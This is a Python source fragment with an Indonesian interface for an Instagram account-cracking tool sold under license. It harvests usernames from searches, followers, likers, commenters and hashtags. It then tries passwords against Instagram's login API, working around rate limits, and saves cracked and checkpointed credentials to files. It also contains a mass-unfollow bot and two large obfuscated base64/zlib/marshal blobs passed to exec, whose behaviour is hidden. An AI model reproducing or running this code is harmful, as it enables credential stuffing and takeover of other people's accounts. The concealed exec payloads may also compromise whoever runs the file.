					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10)
				else:
					open('.logCrack','a').write(f'{N}╭({N}{loop}{N}) {N}{user} {N}|| {N}{pw}\n{N}╰{N}{respon.text}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
			#except Exception as e:prints(e)
		loop+=1

	def checkAPI(self,user,pw):
		global loop,success,checkpoint
		ses=requests.Session()
		ua=self.ua_metode1()
		try:
			ses.get('https://www.instagram.com/web/__mid')
			head={'Host': 'www.instagram.com','Accept':'*/*','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.9','Content-Length':'353','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.instagram.com','Referer':'https://www.instagram.com/accounts/login/?force_classic_login=&','Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','Sec-Ch-Ua-Full-Version-List':'"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"','Sec-Ch-Ua-Mobile':'?0','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent': ua,'X-Asbd-Id':'129477','X-Csrftoken': ses.cookies['csrftoken'],'X-Ig-App-Id':'936619743392459','X-Ig-Www-Claim':'hmac.AR05k4r4Hi4qW2gWrhumyq_wGultMubwNGuatj_4cas9Lr1e','X-Instagram-Ajax':'1007725354','X-Requested-With':'XMLHttpRequest'}
			data = {'enc_password': pw,'optIntoOneTap': 'false','queryParams': {},'trustedDeviceRecords': {},'username':user}
			respon=ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=head,data=data)
			ncek=json.loads(respon.text)
			if "userId" in str(ncek):
				success.append(user)
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
				open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'https://i.instagram.com/challenge' in str(respon.text):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
				open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'Please wait a few minutes' in str(respon.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
			else:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}Akun telah diganti password",width=80,padding=(0,4),style=""))
		except requests.ConnectionError:
			sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
		#except Exception as e:prints(e)
		#self.checkAPI(user,pw)
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t[{bc}!{hapus}] Cek hasil akun crack", padding=(0,4),style=""))
		urut.append(Panel(f"[1] Cek hasil akun {H2}success{hapus}",padding=(0,5),style=""))
		urut.append(Panel(f"[2] Cek hasil akun {K2}checkpoint{hapus}",padding=(0,5),style=""))
		self.tol.print(Columns(urut))
		one=input("Pilihanmu : ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f" [{M2}!{hapus}] tidak ada hasil success");time.sleep(1);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil success");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/checkpoint/')
			except:prints(f" [{M2}!{hapus}] tidak hasil success");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/checkpoint/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{N}] {x} - {K}{len(jum)} {N}akun')		
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/checkpoint/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil checkpoint");time.sleep(1);self.menu()
			print("")
			print( K+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		else:print(f" [{M}!{N}] isi yang benar");time.sleep(2);self.menu()
	def menu(self):
		self.logo()
		c=input(f'  {N}[•] Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			mas='[•] Masukan nama random untuk di searching'
			mas1=nel(mas,style='')
			sol().print(mas1)
			nama=input(f'{N}  [!] Masukan nama :{N} ')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style="")
			sol().print(so)
			name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
		elif c in ('2','02'):
			pr='[•] CRACK DARI PENGIKUT'
			po=nel(pr,style='')
			sol().print(po)
			nama = input(f'{H}• {N}masukan username : {H}{N}')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			user = self.convert(nama)
			self.followers(user, "")
		elif c in ('3','03'):
			pr='[•] CRACK DARI MENGIKUTI'
			po=nel(pr,style='')
			sol().print(po)
			nama = input(f'{H}• {N}masukan username : {H}{N}')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			user = self.convert(nama)
			self.following(user, cokz="")
		elif c in ('5','05'):
			pr='[•] CRACK DARI LIKE POSTINGAN'
			po=nel(pr,style='')
			sol().print(po)
			url = input(f'{H}• {N}masukan url postingan : {H}{N}')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			id=self.mediaid(url)
			nama=self.liker(id)
			self.passwordAPI(nama)
		elif c in ('6','06'):
			pr='[•] CRACK DARI LIKE Komentar'
			po=nel(pr,style='')
			sol().print(po)
			url = input(f'{H}• {N}masukan url postingan : {H}{N}')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			id=self.mediaid(url)
			nama=self.komen(id)
			self.passwordAPI(nama)
		elif c in ('4','04'):
			pr='[•] CRACK DARI HASTAG'
			po=nel(pr,style='')
			sol().print(po)
			has = input(f'{H}• {N}masukan hastag tanpa tanda (#) : {H}{N}')
			tag=has.replace('#','')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			nama=self.tag(tag)
			self.passwordAPI(nama)
		elif c in ('7','07'):
			print('')
			for i in os.listdir('result/checkpoint/'):
				print(f' [{U}!{C}] {i}')
			c=input(f'\n [{CY}?{N}] Masukan nama file: {C}')
			g=open("result/checkpoint/%s"%(c)).read().splitlines()
			print(f'\n{CY} [+] Total Result {H}{len(g)}{C}')
			print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
				self.checkAPI(user,pwd)
			wel='# CRACK ULANG SELESAI'
			cik2=mark(wel ,style='green')
			sol().print(cik2)
			exit()
		elif c in ('8','08'):
			self.cek_hasil()
		elif c in ('9','09'):
			global following
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			nama="unfollow"
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.followers(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id,nama)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U} {C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
		elif c in ('r','R'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()
		else:
			self.menu()
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()   
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyI1NTA2NjA5MCIsIkM1MGRMSmZrV3o1amtzZGhUMjFWWnhqeU9sNzRQWGVLcU1WWkpwN2oiXQ==&ProductId=21019&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  li()
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  login_kamu()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()
def register_device():
	_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'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'))
if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('result')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('mkdir result/success')
	except:pass
	try:os.system('mkdir result/checkpoint')
	except:pass
	_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'gQMkfIwfIee70H+/Dj/PI7f5+/Rh//Nw585tv9FwY/1tu9xwvP87b7f/++9Pv+6rTCP/Psb+3+Wfl7/zTfX62Ibf3+18x7/7P+ay4/fu0733bf4++57XxTqetJv/vtc90TeOmae6a1BiZP57NMOjkDW9qryPn2t9UOnAOiRoGI0gpiS0qf35CxHv4MbDTDJ1633d3o5be2Lct1cK0Jq0sRHSIypC4jtEHhV/5QXoAclpQvD9SgSH9AhBNUMBBCIpP8QPQIFvwBQkpjvwGEldGcQgS59VT03xALqLVSYspH4jwj/dvrQVxN/mLd2U7lUO0pQGu5aSsOgQd6VfywGq/gAyxoHr6CK5F3zaao3V9uC3ueCxcW4khFM790IHornJlafCtCT9AiQD9sjElzeooXnA9fSwopNIZn2NVLYOnKR49R0lxdS1lRSgdAudN0LkIM8NZfZQz4nm/Vrc51rgYJuzfuMtas+sbnSY+UJLrh78CxihJCp6mHa27GYPMmBkxi+vOf+bsJqgP7drSIXCO8GIUk2mi9Yty0VTb0CetQmTOzAWxBUd7eBLdUFfxHzKBwHfr47cYU9KD8+mtEr95TiBQ9s0TM1zYgh/oqeDjOG1ZjHtoSMM9l5824SiaAjx+1sBg2c9pKPjx3JF8uBG6eH6QqlhCQ7ylw6oOAwBpDg9nOUDyiwrRhNJ3DaUR+LssQOa4H+5qbccLedkDSQlNCnZa2nB1xWa6Kzt0GDPVIKT97phXz4kV/RV+L1diMLftqAuWAvvsq73FaFVrw+HwutPmySXRnMGH6kAubMwMuvwXlzyfwHUGUSr2cCMJOttjYdiOx5uNyqSBJJKzUWfwWq8TnrP4dqeu2TJZVpDvO8eG/1n4CD0XlHbKF8VMcCDA+cetDDtkvhjzyRItD8pqMDzLqfksmbsD4yf6F7MGNR0hKP5oMv6bvhMJ6zuepopk9Yy0L9VMmnpG0gfAud6TJcOruBXvvHFG5MZhzf+2k7tC4R0JS07XhWxmOR8d5kZszghmvapAXQbwKFwquoyiwgiMO9GYnq7ul9xBY7p1iGY9qTsv8GdLQESr6p50nMlXXB379WKPS8ZcWnd5Jys4X0WUSDe6Fv9+Lze8hSkT4xM+sBaTHl/2X1gGEqcAS9HUk8lakuYYlkWXha5OdKXwH8kbkQ3O